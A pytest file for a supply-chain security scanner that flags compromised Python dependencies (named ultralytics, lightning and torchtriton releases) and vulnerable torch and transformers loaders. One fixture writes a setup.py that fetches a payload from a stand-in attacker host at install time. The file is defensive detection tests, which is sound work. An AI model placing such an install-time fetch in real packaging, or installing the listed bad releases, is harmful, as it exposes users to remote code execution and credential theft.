from pathlib import Path

from guardana.core.rule import RuleContext
from guardana.core.severity import Severity
from guardana.core.target import ArtifactTarget
from guardana.rules.supply_chain._advisories import Advisory
from guardana.rules.supply_chain.malicious_dependency import MaliciousDependencyRule


def _findings(tmp_path: Path) -> list[tuple[str, str]]:
    rule = MaliciousDependencyRule()
    return [
        (f.severity.name, f.evidence.summary)
        for f in rule.run(ArtifactTarget(tmp_path), RuleContext())
    ]


def test_flags_known_bad_version_in_requirements(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("numpy==1.26.0\nultralytics==8.3.41\n")
    findings = _findings(tmp_path)
    assert len(findings) == 1
    assert findings[0][0] == "HIGH"
    assert "ultralytics" in findings[0][1]


def test_flags_known_bad_version_in_pyproject(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text('dependencies = ["ultralytics==8.3.45"]\n')
    assert any("ultralytics" in s for _, s in _findings(tmp_path))


def test_flags_known_bad_version_in_a_poetry_style_lockfile(tmp_path: Path) -> None:
    # poetry.lock / uv.lock / pdm.lock put name and version on separate lines in a
    # [[package]] block — the authoritative pin. A same-line-only scan missed them.
    (tmp_path / "poetry.lock").write_text(
        '[[package]]\nname = "numpy"\nversion = "1.26.0"\n\n'
        '[[package]]\nname = "ultralytics"\nversion = "8.3.41"\ndescription = "x"\n',
        encoding="utf-8",
    )
    findings = _findings(tmp_path)
    assert len(findings) == 1
    assert findings[0][0] == "HIGH"
    assert "ultralytics" in findings[0][1]


def test_safe_version_of_a_watched_package_is_clean(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("ultralytics==8.3.200\n")
    assert _findings(tmp_path) == []


def test_a_longer_version_sharing_a_bad_prefix_is_not_flagged(tmp_path: Path) -> None:
    # 8.3.410 is a different, innocent release; a substring test wrongly matched
    # the known-bad 8.3.41 inside it.
    (tmp_path / "requirements.txt").write_text("ultralytics==8.3.410\n", encoding="utf-8")
    assert _findings(tmp_path) == []


def test_safe_version_in_a_lockfile_block_is_clean(tmp_path: Path) -> None:
    (tmp_path / "uv.lock").write_text(
        '[[package]]\nname = "ultralytics"\nversion = "8.3.200"\n', encoding="utf-8"
    )
    assert _findings(tmp_path) == []


def test_unrelated_dependencies_are_clean(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("numpy==1.26.0\npandas==2.2.0\n")
    assert _findings(tmp_path) == []


def test_an_old_torch_is_reported_as_a_loader_that_arms_pickle_findings(tmp_path: Path) -> None:
    # torch < 2.6 reaches code execution through torch.load even with
    # weights_only=True, so it is the thing that would run a poisoned checkpoint
    # this same scan looks for. A lead, not a gate failure.
    (tmp_path / "requirements.txt").write_text("torch==2.2.0\n", encoding="utf-8")
    findings = _findings(tmp_path)
    assert [severity for severity, _ in findings] == ["MEDIUM"]
    assert "CVE-2025-32434" in findings[0][1]


def test_flags_network_fetch_in_setup_py(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "from urllib.request import urlopen\nurlopen('http://evil.example/payload')\n",
        encoding="utf-8",
    )
    findings = _findings(tmp_path)
    assert len(findings) == 1
    assert findings[0][0] == "MEDIUM"
    assert "setup.py" in findings[0][1].lower() or "install-time" in findings[0][1]


def test_plain_setup_py_is_clean(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\nsetup(name='x', version='1.0')\n", encoding="utf-8"
    )
    assert _findings(tmp_path) == []


def test_flags_a_compromised_lightning_release_in_a_lockfile(tmp_path: Path) -> None:
    (tmp_path / "poetry.lock").write_text(
        '[[package]]\nname = "lightning"\nversion = "2.6.2"\n', encoding="utf-8"
    )
    findings = _findings(tmp_path)
    assert [severity for severity, _ in findings] == ["HIGH"]
    assert "credential-stealing" in findings[0][1]


def test_flags_a_dependency_confusion_package_at_any_version(tmp_path: Path) -> None:
    # torchtriton on PyPI is not PyTorch's package at all, so no version of it is
    # the one you meant to install — the name is the finding.
    (tmp_path / "requirements.txt").write_text("torchtriton\n", encoding="utf-8")
    assert [severity for severity, _ in _findings(tmp_path)] == ["HIGH"]


def test_flags_a_loader_whose_vulnerability_arms_an_artifact_finding(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("transformers==4.57.0\n", encoding="utf-8")
    rule = MaliciousDependencyRule()
    findings = list(rule.run(ArtifactTarget(tmp_path), RuleContext()))
    assert [f.severity.name for f in findings] == ["MEDIUM"]
    assert findings[0].verdict is not None  # a lead: it matters only if something poisoned arrives
    assert "CVE-2026-4372" in findings[0].evidence.summary


def test_a_patched_loader_is_not_flagged(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text(
        "transformers==5.3.1\ntorch==2.7.0\n", encoding="utf-8"
    )
    assert _findings(tmp_path) == []


def test_a_pre_kernel_dispatch_transformers_is_not_flagged(tmp_path: Path) -> None:
    # The kernel-dispatch path only exists from 4.56.0; older releases do not have
    # the vulnerable code at all, so flagging them would be noise.
    (tmp_path / "requirements.txt").write_text("transformers==4.40.0\n", encoding="utf-8")
    assert _findings(tmp_path) == []


def test_a_range_pin_says_nothing_because_it_pins_nothing(tmp_path: Path) -> None:
    # `torch>=2.0` does not say what gets installed. Guessing would manufacture a
    # finding out of a constraint that may well resolve to a patched release.
    (tmp_path / "requirements.txt").write_text("torch>=2.0\n", encoding="utf-8")
    assert _findings(tmp_path) == []


def test_a_custom_advisory_dataset_is_honoured(tmp_path: Path) -> None:
    advisories = (
        Advisory(
            id="ACME-1",
            package="acme-ml",
            kind="malicious_release",
            versions=("1.0.0",),
            severity=Severity.CRITICAL,
            summary="internal incident 4711",
            reference="https://example.invalid",
        ),
    )
    (tmp_path / "requirements.txt").write_text("acme-ml==1.0.0\n", encoding="utf-8")
    rule = MaliciousDependencyRule(advisories=advisories)
    findings = list(rule.run(ArtifactTarget(tmp_path), RuleContext()))
    assert [f.severity for f in findings] == [Severity.CRITICAL]
